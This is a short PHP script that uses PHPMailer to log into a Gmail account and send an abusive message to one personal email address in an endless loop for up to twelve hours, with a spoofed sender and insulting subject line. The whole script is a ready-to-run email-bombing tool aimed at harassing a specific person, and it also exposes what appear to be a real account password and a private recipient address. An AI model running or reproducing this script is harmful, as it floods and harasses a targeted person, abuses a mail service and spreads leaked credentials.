<?
require_once('class.phpmailer.php');
set_time_limit ( 43200 );//12 hours
$mail             = new PHPMailer();
$mail->IsSMTP(); // telling the class to use SMTP
$mail->SMTPAuth   = true;                  // enable SMTP authentication
$mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
$mail->Port       = 465;                   // set the SMTP port for the GMAIL server
$mail->Username   = "ppsfail@gmail.com";  // GMAIL username
$mail->Password   = "PPSSUXHARD";            // GMAIL password
$mail->SetFrom('you@win.com', 'You win lol');
$mail->Subject    = "So you think you can fuck with me?";
$mail->Body = "55 minutes late lol...";
$address = "bobivild@abv.bg";
$mail->AddAddress($address, "You're fucked");

while(1) { 
$mail->Send();
}

?>

